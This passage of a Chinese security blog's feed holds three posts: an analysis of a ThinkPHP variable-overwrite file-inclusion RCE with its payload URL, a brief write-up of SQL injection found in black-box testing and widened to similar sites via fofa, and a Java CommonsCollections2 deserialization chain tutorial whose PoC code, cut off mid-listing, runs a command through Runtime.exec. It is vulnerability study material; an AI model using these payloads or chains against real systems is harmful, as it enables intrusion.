class="hljs-variable">&amp;value</span>[_filename]=./Application/Runtime/Logs/Common/21_07_12.log<br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/WksRRe"><img src="https://z3.ax1x.com/2021/07/13/WksRRe.png" alt="WksRRe.png"></a></p><h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>先进入assign方法</p><p><a href="https://imgtu.com/i/WksgPO"><img src="https://z3.ax1x.com/2021/07/13/WksgPO.png" alt="WksgPO.png"></a></p><p>把assign方法的第一个参数赋值给$this-&gt;tVar</p><p><a href="https://imgtu.com/i/Wks6IK"><img src="https://z3.ax1x.com/2021/07/13/Wks6IK.png" alt="Wks6IK.png"></a></p><p><code>ThinkPHP/Library/Think/View.class.php</code></p><p>assign方法结束后进入display</p><p><a href="https://imgtu.com/i/Wks2GD"><img src="https://z3.ax1x.com/2021/07/13/Wks2GD.png" alt="Wks2GD.png"></a></p><p><code>ThinkPHP/Library/Think/View.class.php#fetch</code></p><p>进入fetch方法，因为模板文件名为空，所以先调用parseTemplate获取默认模板文件（./Application/Home/View/Index/index.html），也就是之前新建的文件。</p><p><a href="https://imgtu.com/i/Wks5qI"><img src="https://z3.ax1x.com/2021/07/13/Wks5qI.png" alt="Wks5qI.png"></a></p><p>然后构造了params数组，包含了传入的value数组和默认模板文件名</p><p><a href="https://imgtu.com/i/WksoZt"><img src="https://z3.ax1x.com/2021/07/13/WksoZt.png" alt="WksoZt.png"></a></p><p><code>/ThinkPHP/Library/Think/Hook.class.php</code></p><p>进入exec</p><p><a href="https://imgtu.com/i/WksTdP"><img src="https://z3.ax1x.com/2021/07/13/WksTdP.png" alt="WksTdP.png"></a></p><p><code>/ThinkPHP/Library/Think/Hook.class.php</code></p><p>实际调用Behavior\ParseTemplateBehavior-&gt;run，把params数组作为参数</p><p><a href="https://imgtu.com/i/Wks7If"><img src="https://z3.ax1x.com/2021/07/13/Wks7If.png" alt="Wks7If.png"></a></p><p><code>/ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php</code></p><p>调用fetch</p><p><a href="https://imgtu.com/i/WksLRg"><img src="https://z3.ax1x.com/2021/07/13/WksLRg.png" alt="WksLRg.png"></a></p><p><code>/ThinkPHP/Library/Think/Template.class.php</code></p><p>获取缓存文件路径，然后进入load方法</p><p><a href="https://imgtu.com/i/Wksbi8"><img src="https://z3.ax1x.com/2021/07/13/Wksbi8.png" alt="Wksbi8.png"></a></p><p><code>/ThinkPHP/Library/Think/Storage/Driver/File.class.php</code></p><p>调用extract，将$vars数组作为参数进行变量覆盖。把$_filename覆盖为日志文件名，然后包含日志文件</p><p><a href="https://imgtu.com/i/Wks4sA"><img src="https://z3.ax1x.com/2021/07/13/Wks4sA.png" alt="Wks4sA.png"></a></p><p>再回来看看payload，实际上只是传入了一个包含日志文件名的value数组，只需要关注它的流向就可以了</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-meta">index</span>.php?m=Home<span class="hljs-variable">&amp;c</span>=<span class="hljs-meta">Index</span><span class="hljs-variable">&amp;a</span>=<span class="hljs-meta">index</span><span class="hljs-variable">&amp;value</span>[_filename]=./Application/Runtime/Logs/Common/21_07_12.log<br></code></pre></td></tr></table></figure><p><strong>传入的value数组的流向：</strong></p><ol><li><p>在assign()方法中，传入的value数组被赋值给$this-&gt;tVar</p><p><a href="https://imgtu.com/i/Wky9oV"><img src="https://z3.ax1x.com/2021/07/13/Wky9oV.png" alt="Wky9oV.png"></a></p></li><li><p>在<code>ThinkPHP/Library/Think/View.class.php#fetch</code>中被赋值给params数组，然后作为第二个参数传给listen</p><p><a href="https://imgtu.com/i/WksOzQ"><img src="https://z3.ax1x.com/2021/07/13/WksOzQ.png" alt="WksOzQ.png"></a></p></li><li><p>在<code>/ThinkPHP/Library/Think/Hook.class.php#listen</code>中作为第三个参数传给exec</p><p><a href="https://imgtu.com/i/WksjMj"><img src="https://z3.ax1x.com/2021/07/13/WksjMj.png" alt="WksjMj.png"></a></p></li><li><p>在<code>/ThinkPHP/Library/Think/Hook.class.php#exec</code>中调用Behavior\ParseTemplateBehavior-&gt;run，把params数组作为参数</p><p><a href="https://imgtu.com/i/WksxLn"><img src="https://z3.ax1x.com/2021/07/13/WksxLn.png" alt="WksxLn.png"></a></p></li><li><p>在<code>/ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php#run</code>中，params[‘value’]也就是value数组被作为第二个参数传入fetch</p><p><a href="https://imgtu.com/i/WkySZq"><img src="https://z3.ax1x.com/2021/07/13/WkySZq.png" alt="WkySZq.png"></a></p></li><li><p>在<code>/ThinkPHP/Library/Think/Template.class.php#fetch</code>中又继续作为第二个参数传入load</p><p><a href="https://imgtu.com/i/Wkypd0"><img src="https://z3.ax1x.com/2021/07/13/Wkypd0.png" alt="Wkypd0.png"></a></p></li><li><p>在<code>/ThinkPHP/Library/Think/Storage/Driver/File.class.php#load</code>中进行变量覆盖，最终包含传入value数组中的<code>_filename</code>，执行了向日志文件中写入的代码，实现RCE</p><p><a href="https://imgtu.com/i/Wksvss"><img src="https://z3.ax1x.com/2021/07/13/Wksvss.png" alt="Wksvss.png"></a></p></li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在代码审计知识星球看到了这个新出的漏洞，分析后感觉更适合作为权限维持的后门，实际业务代码中应该很少有这种情况</p><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzkzNjI2MzgzOA==&amp;mid=2247483682&amp;idx=1&amp;sn=e7cb243b2c320610356d100ca05bdc70&amp;chksm=c2a028d3f5d7a1c5ea3a4f636896a2eca12479418bbf409309af7378dbf956b0bc0545a226d4&amp;mpshare=1&amp;scene=23&amp;srcid=07121TA77hb0MtSPJ6UdbS0q&amp;sharer_sharetime=1626084466936&amp;sharer_shareid=f045ea83ab618e2dffd974c4e052cd1b#rd">https://mp.weixin.qq.com/s?__biz=MzkzNjI2MzgzOA==&amp;mid=2247483682&amp;idx=1&amp;sn=e7cb243b2c320610356d100ca05bdc70&amp;chksm=c2a028d3f5d7a1c5ea3a4f636896a2eca12479418bbf409309af7378dbf956b0bc0545a226d4&amp;mpshare=1&amp;scene=23&amp;srcid=07121TA77hb0MtSPJ6UdbS0q&amp;sharer_sharetime=1626084466936&amp;sharer_shareid=f045ea83ab618e2dffd974c4e052cd1b#rd</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>记一次黑盒测试</title>
    <link href="/2021/07/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/"/>
    <url>/2021/07/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<h1 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h1><p>黑盒测试中发现目标网站登录处存在注入，目标系统统一使用sql server。这里传参有点问题，sqlmap没跑出来，所以手动编写poc验证</p><p><a href="https://imgtu.com/i/WCn1eS"><img src="https://z3.ax1x.com/2021/07/11/WCn1eS.png" alt="WCn1eS.png"></a></p><p>编写poc验证，读取数据库名</p><p><a href="https://imgtu.com/i/WCnJij"><img src="https://z3.ax1x.com/2021/07/11/WCnJij.png" alt="WCnJij.png"></a></p><p><a href="https://imgtu.com/i/WCnYJs"><img src="https://z3.ax1x.com/2021/07/11/WCnYJs.png" alt="WCnYJs.png"></a></p><p>fofa查找一波同类站点</p><p><a href="https://imgtu.com/i/WCn3dg"><img src="https://z3.ax1x.com/2021/07/11/WCn3dg.png" alt="WCn3dg.png"></a></p><p>从报错信息中得到了一些模糊的信息，查找到了开发公司，通过查看该公司官网，发现旗下还有一款产品存在同样漏洞</p><p><a href="https://imgtu.com/i/WCn8oQ"><img src="https://z3.ax1x.com/2021/07/11/WCn8oQ.png" alt="WCn8oQ.png"></a></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总体而言技术含量不高。黑盒测试挖掘cnvd证书的关键是从点到面，定位到开发公司，再fofa或google批量查找同类型的系统，从单一网站漏洞延申到通用漏洞。</p><p><a href="https://imgtu.com/i/WCntWn"><img src="https://z3.ax1x.com/2021/07/11/WCntWn.png" alt="WCntWn.png"></a></p><p><a href="https://imgtu.com/i/WCnNzq"><img src="https://z3.ax1x.com/2021/07/11/WCnNzq.png" alt="WCnNzq.png"></a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CommonsCollections2利用链学习</title>
    <link href="/2021/07/08/CommonsCollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"/>
    <url>/2021/07/08/CommonsCollections2%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>依赖commmonscollections4（3.1中TransformingComparator没有继承自Serializable所以无法进行Java反序列化）</p><p>pom.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.25.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="javasist"><a href="#javasist" class="headerlink" title="javasist"></a>javasist</h2><p>用于生成字节码</p><p>先在pom.xml添加依赖</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.javassist<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>javassist<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.25.0-GA<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassClassPath;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">JavassistTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br><br>        <span class="hljs-comment">//ClassPool是一个CtClass对象的容器，一个CtClass必须从中进行获取，ClassPool.getDefault()返回默认的类池</span><br>        ClassPool pool = ClassPool.getDefault();<br>        <span class="hljs-comment">//添加类搜索路径</span><br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        <span class="hljs-comment">//创建名为Evil的类</span><br>        CtClass test = pool.makeClass(<span class="hljs-string">&quot;Evil&quot;</span>);<br>        String name = <span class="hljs-string">&quot;Evil&quot;</span> + System.nanoTime();<br>        test.setName(name);<br>        <span class="hljs-comment">//定义要插入的字节码</span><br>        String cmd = <span class="hljs-string">&quot;System.out.println(\&quot;Hello,Javasist\&quot;);&quot;</span>;<br>        <span class="hljs-comment">//设置要继承的类</span><br>        test.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br>        <span class="hljs-comment">//创建一个空的类初始化器（静态构造函数）</span><br>        CtConstructor constructor = test.makeClassInitializer();<br>        <span class="hljs-comment">//将字节码插入到开头</span><br>        constructor.insertBefore(cmd);<br>        <span class="hljs-comment">//将编译的类创建为`.class` 文件</span><br>        test.writeFile(<span class="hljs-string">&quot;./&quot;</span>);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>可以看到生成了一个class文件</p><p><a href="https://imgtu.com/i/Rj9r6K"><img src="https://z3.ax1x.com/2021/07/09/Rj9r6K.png" alt="Rj9r6K.png"></a></p><p>.class文件的内容</p><p><a href="https://imgtu.com/i/Rj9Dl6"><img src="https://z3.ax1x.com/2021/07/09/Rj9Dl6.png" alt="Rj9Dl6.png"></a></p><h2 id="ClassLoader-defineClass"><a href="#ClassLoader-defineClass" class="headerlink" title="ClassLoader#defineClass"></a>ClassLoader#defineClass</h2><p>ClassLoader是Java的类加载器，主要用于加载字节码</p><p>利用类加载器的defineClass方法来加载字节码，但是由于ClassLoader#defineClass方法是protected所以无法直接从外部进行调用，只能通过反射来调用这个方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java">Class clas = Class.forName(<span class="hljs-string">&quot;java.lang.ClassLoader&quot;</span>);<br>        Method defineclass = clas.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, String.class, <span class="hljs-keyword">byte</span>[].class, <span class="hljs-keyword">int</span>.class, <span class="hljs-keyword">int</span>.class);<br>        defineclass.setAccessible(<span class="hljs-keyword">true</span>);<br>        Class claz = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),<span class="hljs-string">&quot;Evil&quot;</span>,bytes,<span class="hljs-number">0</span>,bytes.length);<br>        claz.newInstance();<br></code></pre></td></tr></table></figure><h2 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h2><p>在TemplatesImpl类中定义了一个内部类TransletClassLoader，在这个类中对loadClass进行了重写并且可以被外部进行调用，可以被用来加载字节码</p><p>两个要求</p><ol><li>要利用反射设置这四个属性</li><li>javasist生成的代码要继承自<code>AbstractTranslet</code></li></ol><p>利用TemplatesImpl来加载字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.*;<br><br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TemplatesTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception </span>&#123;<br>        ClassPool pool = ClassPool.getDefault();<br>        pool.insertClassPath(<span class="hljs-keyword">new</span> ClassClassPath(AbstractTranslet.class));<br>        CtClass clas = pool.makeClass(<span class="hljs-string">&quot;TempTest&quot;</span>);<br><br>        clas.setSuperclass(pool.get(AbstractTranslet.class.getName()));<br><br>        String cmd = <span class="hljs-string">&quot;System.out.println(\&quot;Templates Test\&quot;);&quot;</span>;<br>        CtConstructor constructor = clas.makeClassInitializer();<br>        constructor.insertBefore(cmd);<br>        clas.writeFile(<span class="hljs-string">&quot;./&quot;</span>);<br><br>        <span class="hljs-keyword">byte</span>[] bytes = clas.toBytecode();<br><br>        TemplatesImpl templates = TemplatesImpl.class.newInstance();<br><br>        Class temp = Class.forName(<span class="hljs-string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);<br>        Field _name = temp.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        _name.setAccessible(<span class="hljs-keyword">true</span>);<br>        _name.set(templates,<span class="hljs-string">&quot;tttt&quot;</span>);<br>        setFieled(templates,temp,<span class="hljs-string">&quot;_name&quot;</span>,<span class="hljs-string">&quot;tttt&quot;</span>);<br>        setFieled(templates,temp,<span class="hljs-string">&quot;_class&quot;</span>,<span class="hljs-keyword">null</span>);<br>        setFieled(templates,temp,<span class="hljs-string">&quot;_bytecodes&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[][]&#123;bytes&#125;);<br>        setFieled(templates,temp,<span class="hljs-string">&quot;_tfactory&quot;</span>,<span class="hljs-keyword">new</span> TransformerFactoryImpl());<br><br>        templates.getOutputProperties();<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setFieled</span><span class="hljs-params">(TemplatesImpl templates,Class clas ,String fieled,Object obj)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        Field _field = clas.getDeclaredField(fieled);<br>        _field.setAccessible(<span class="hljs-keyword">true</span>);<br>        _field.set(templates,obj);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><a href="https://imgtu.com/i/Rj9BSx"><img src="https://z3.ax1x.com/2021/07/09/Rj9BSx.png" alt="Rj9BSx.png"></a></p><p>成功加载了生成的class文件</p><p><a href="https://imgtu.com/i/Rj9sOO"><img src="https://z3.ax1x.com/2021/07/09/Rj9sOO.png" alt="Rj9sOO.png"></a></p><p>触发过程</p><p><a href="https://imgtu.com/i/Rj96mD"><img src="https://z3.ax1x.com/2021/07/09/Rj96mD.png" alt="Rj96mD.png"></a></p><h3 id="为什么要先用反射设置属性？"><a href="#为什么要先用反射设置属性？" class="headerlink" title="为什么要先用反射设置属性？"></a>为什么要先用反射设置属性？</h3><p>在getTransletInstance中，需要满足条件<code>_name!==null</code>和<code>_class==null</code>才能进入defineTransletClasses</p><p><a href="https://imgtu.com/i/Rj9c0e"><img src="https://z3.ax1x.com/2021/07/09/Rj9c0e.png" alt="Rj9c0e.png"></a></p><p>进入defineTransletClasses，<code>_bytecodes</code>的值为被加载的字节码</p><p><a href="https://imgtu.com/i/Rj9Rkd"><img src="https://z3.ax1x.com/2021/07/09/Rj9Rkd.png" alt="Rj9Rkd.png"></a></p><h3 id="为什么javasist生成的代码要继承自AbstractTranslet？"><a href="#为什么javasist生成的代码要继承自AbstractTranslet？" class="headerlink" title="为什么javasist生成的代码要继承自AbstractTranslet？"></a>为什么javasist生成的代码要继承自AbstractTranslet？</h3><p>defineTransletClasses中存在对父类的判断，父类不是ABSTRACT_TRANSLET的时候会报错。所以在生成字节码的时候需要设置父类</p><p><a href="https://imgtu.com/i/Rj9gTH"><img src="https://z3.ax1x.com/2021/07/09/Rj9gTH.png" alt="Rj9gTH.png"></a></p><h1 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h1><h2 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><code>org.apache.commons.collections4.comparators.TransformingComparator#compare</code></p><p>漏洞起点是<code>TransformingComparator.compare()</code>，其中触发了<code>transform</code>方法</p><p><a href="https://imgtu.com/i/Rj9WtA"><img src="https://z3.ax1x.com/2021/07/09/Rj9WtA.png" alt="Rj9WtA.png"></a></p><p><code>org.apache.commons.collections4.comparators.TransformingComparator#TransformingComparator</code></p><p><code>this.transformer</code>可控，来源于构造函数中传入的<code>transform</code>参数</p><p><a href="https://imgtu.com/i/Rj9ffI"><img src="https://z3.ax1x.com/2021/07/09/Rj9ffI.png" alt="Rj9ffI.png"></a></p><p>接下来就跟之前一样了，由于我们可以调用任意类的transform方法，只需在构造方法中传入构造好的<code>ChainedTransforme</code>然后触发反射链执行命令</p><p><a href="https://imgtu.com/i/Rj94pt"><img src="https://z3.ax1x.com/2021/07/09/Rj94pt.png" alt="Rj94pt.png"></a></p><p>接下来我们需要找到能触发<code>TransformingComparator.compare()</code>并 且传入参数可控的点</p><p>条件:</p><ol><li>能触发<code>TransformingComparator.compare()</code></li><li>传入<code>compare</code>函数的参数可控，这样才能传入<code>ChainedTransformer</code>执行反射链</li></ol><h2 id="PriorityQueue-执行命令"><a href="#PriorityQueue-执行命令" class="headerlink" title="PriorityQueue(执行命令)"></a>PriorityQueue(执行命令)</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p><code>java.util.PriorityQueue#readObject</code></p><p>这里对传入参数ObjectInputStream进行反序列化，然后赋值给queue数组</p><p><a href="https://imgtu.com/i/Rj951P"><img src="https://z3.ax1x.com/2021/07/09/Rj951P.png" alt="Rj951P.png"></a></p><p>queue是属性，可以使用反射修改它，所以queue可控</p><p><a href="https://imgtu.com/i/Rj9b7Q"><img src="https://z3.ax1x.com/2021/07/09/Rj9b7Q.png" alt="Rj9b7Q.png"></a></p><p><code>java.util.PriorityQueue#heapify</code></p><p>接下来进入 <code>heapify()</code> 函数，这里的queue跟上面一样，也是可控的</p><p><a href="https://imgtu.com/i/Rj9I6f"><img src="https://z3.ax1x.com/2021/07/09/Rj9I6f.png" alt="Rj9I6f.png"></a></p><p><code>java.util.PriorityQueue#siftDown</code></p><p>继续来看 <code>siftDown()</code> 函数，如果comparator不为null，那么就会进入<code>siftDownUsingComparator()</code> 函数，此时x可控</p><p><a href="https://imgtu.com/i/Rj9oX8"><img src="https://z3.ax1x.com/2021/07/09/Rj9oX8.png" alt="Rj9oX8.png"></a></p><p><code>java.util.PriorityQueue#siftDownUsingComparator</code></p><p>调用comparator的compare函数, 这里的 <code>x</code> 就是上面传进来的queue，是可控的。利用反射让<code>comparator</code>等于<code>TransformingComparator</code>就可以调用<code>TransformingComparator.compare()</code>。同时x可控，这样就可以利用 <code>InvokerTransformer</code> 触发任意类的任意方法。</p><p><a href="https://imgtu.com/i/Rj97nS"><img src="https://z3.ax1x.com/2021/07/09/Rj97nS.png" alt="Rj97nS.png"></a></p><p>poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>        <br>        <span class="hljs-comment">//构造ChainedTransformer</span><br>        ChainedTransformer chain = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[] &#123;<br>            <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;<br>                String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<br>                <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> Class[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[] &#123;<br>                Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> Object[] &#123;<br>                <span class="hljs-keyword">null</span>, <span class="hljs-keyword">new</span> Object[<span class="hljs-number">0</span>] &#125;),<br>            <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>,<br>                <span class="hljs-keyword">new</span> Class[] &#123; String.class &#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)&#125;);<br>        <br>        <span class="hljs-comment">//通过构造函数给this.transformer赋值</span><br>        TransformingComparator transformingComparator = <span class="hljs-keyword">new</span> TransformingComparator(chain);<br>        <span class="hljs-comment">//也可通过构造函数直接进行传入</span><br>        <span class="hljs-comment">//PriorityQueue queue = new PriorityQueue(1,transformingComparator);</span><br><br>        PriorityQueue queue = 